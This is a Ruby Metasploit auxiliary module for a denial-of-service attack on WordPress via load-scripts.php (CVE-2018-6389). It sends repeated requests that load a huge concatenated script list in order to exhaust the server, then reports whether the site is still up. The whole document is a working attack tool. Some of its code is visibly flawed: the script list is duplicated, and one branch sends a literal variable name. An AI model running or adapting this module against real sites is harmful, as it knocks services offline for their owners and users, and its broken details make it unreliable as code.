require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos
  def initialize(info = {})
    super(update_info(info,
     'Name'           => 'WordPress DOS load-scripts.php',
     'Description'    => %q{WordPress DOS load-scripts.php CVE-2018-6389},
     'Author'         => [ 'Diego Soto Fau <diego@sys-secure.es>', 'Sys-Secure <sys-secure.es>' ],
     'License'        => MSF_LICENSE
     ))
    register_options([
      OptString.new('TARGETURI', [true, 'The base path', '/']),
      OptString.new('PLUGIN_LIST', [true, 'The plugin list for request', 'Default']),
      OptInt.new('RLIMIT', [true, 'The number of requests to send', 200])
    ], self.class)
  end

  def run
    default_plugin_list='accordion,admin-bar,api-request,autocomplete,autosave,backbone,button,code-editor,codemirror,colorpicker,color-picker,color-scheme-control,comment,comment-reply,common,core,cropper,csslint,custom-background,custom-header,custom-html-widgets,customize-base,customize-controls,customize-loader,customize-models,customize-nav-menus,customize-preview,customize-preview-nav-menus,customize-preview-widgets,customizer,customize-selective-refresh,customize-views,customize-widgets,dashboard,datepicker,dialog,draggable,droppable,editable_selects,edit-comments,editor,editor-expand,effect,effect-blind,effect-bounce,effect-clip,effect-drop,effect-explode,effect-fade,effect-fold,effect-highlight,effect-puff,effect-pulsate,effect-scale,effect-shake,effect-size,effect-slide,effect-transfer,esprima,fakejshint,farbtastic,featured-content-admin,form_utils,functions,gallery,global,handlers,heartbeat,hoverIntent,html5,htmlhint,htmlhint-kses,image-edit,imagesloaded,inline-edit-post,inline-edit-tax,iris,jquery,jquery-migrate,js,json2,jsonlint,keyboard-image-navigation,language-chooser,link,masonry,mce-view,mctabs,media,media-audiovideo,media-audio-widget,media-editor,mediaelement,mediaelement-and-player,mediaelement-migrate,media-gallery,media-gallery-widget,media-grid,media-image-widget,media-models,media-upload,media-video-widget,media-views,media-widgets,menu,mouse,moxie,navigation,nav-menu,password-strength-meter,plugin,plugin-install,plupload,position,post,postbox,progressbar,quicktags,resizable,revisions,selectable,selectmenu,set-post-thumbnail,shortcode,showcase,skip-link-focus-fix,slider,sortable,spinner,suggest,svg-painter,swfobject,swfupload,tabs,tags,tags-box,tags-suggest,text-widgets,theme,theme-customizer,theme-options,theme-plugin-editor,thickbox,tinymce,tiny_mce_popup,tooltip,twemoji,tw-sack,underscore,updates,user-profile,user-suggest,utils,validate,vimeo,widget,widgets,word-count,wp-a11y,wp-ajax-response,wp-api,wp-auth-check,wp-backbone,wp-custom-header,wpdialog,wp-embed,wp-embed-template,wp-emoji,wp-emoji-loader,wp-emoji-release,wp-fullscreen-stub,wp-langs-en,wplink,wp-list-revisions,wp-lists,wp-mediaelement,wp-playlist,wp-plupload,wp-pointer,wp-sanitize,wp-util,xfn,zxcvbn,zxcvbn-asyncaccordion,admin-bar,api-request,autocomplete,autosave,backbone,button,code-editor,codemirror,colorpicker,color-picker,color-scheme-control,comment,comment-reply,common,core,cropper,csslint,custom-background,custom-header,custom-html-widgets,customize-base,customize-controls,customize-loader,customize-models,customize-nav-menus,customize-preview,customize-preview-nav-menus,customize-preview-widgets,customizer,customize-selective-refresh,customize-views,customize-widgets,dashboard,datepicker,dialog,draggable,droppable,editable_selects,edit-comments,editor,editor-expand,effect,effect-blind,effect-bounce,effect-clip,effect-drop,effect-explode,effect-fade,effect-fold,effect-highlight,effect-puff,effect-pulsate,effect-scale,effect-shake,effect-size,effect-slide,effect-transfer,esprima,fakejshint,farbtastic,featured-content-admin,form_utils,functions,gallery,global,handlers,heartbeat,hoverIntent,html5,htmlhint,htmlhint-kses,image-edit,imagesloaded,inline-edit-post,inline-edit-tax,iris,jquery,jquery-migrate,js,json2,jsonlint,keyboard-image-navigation,language-chooser,link,masonry,mce-view,mctabs,media,media-audiovideo,media-audio-widget,media-editor,mediaelement,mediaelement-and-player,mediaelement-migrate,media-gallery,media-gallery-widget,media-grid,media-image-widget,media-models,media-upload,media-video-widget,media-views,media-widgets,menu,mouse,moxie,navigation,nav-menu,password-strength-meter,plugin,plugin-install,plupload,position,post,postbox,progressbar,quicktags,resizable,revisions,selectable,selectmenu,set-post-thumbnail,shortcode,showcase,skip-link-focus-fix,slider,sortable,spinner,suggest,svg-painter,swfobject,swfupload,tabs,tags,tags-box,tags-suggest,text-widgets,theme,theme-customizer,theme-options,theme-plugin-editor,thickbox,tinymce,tiny_mce_popup,tooltip,twemoji,tw-sack,underscore,updates,user-profile,user-suggest,utils,validate,vimeo,widget,widgets,word-count,wp-a11y,wp-ajax-response,wp-api,wp-auth-check,wp-backbone,wp-custom-header,wpdialog,wp-embed,wp-embed-template,wp-emoji,wp-emoji-loader,wp-emoji-release,wp-fullscreen-stub,wp-langs-en,wplink,wp-list-revisions,wp-lists,wp-mediaelement,wp-playlist,wp-plupload,wp-pointer,wp-sanitize,wp-util,xfn,zxcvbn,zxcvbn-async'
    starting = 1
    rlimit = datastore['RLIMIT']
    plugin_list = datastore['PLUGIN_LIST']
    while starting < rlimit do
      uri = target_uri.path
      if plugin_list == 'Default'
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(uri, 'wp-admin/load-scripts.php?c=1&load=', default_plugin_list),
          'vars_get' => {
            'c' => "1",
            'load' => plugin_list
          }
        })
      else
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(uri, 'wp-admin/load-scripts.php?c=1&load=', 'plugin_list'),
          'vars_get' => {
            'c' => "1",
            'load' => plugin_list
          }
        })
      end
      if res && res.code == 200
       print_good("I got a 200, up")
      else
       print_error("No 200, down")
      end
      starting += 1
    end
    if res && res.code == 200
     print_good("I got a 200, awesome")
    else
     print_error("No 200, feeling blue")
    end
   end
  end
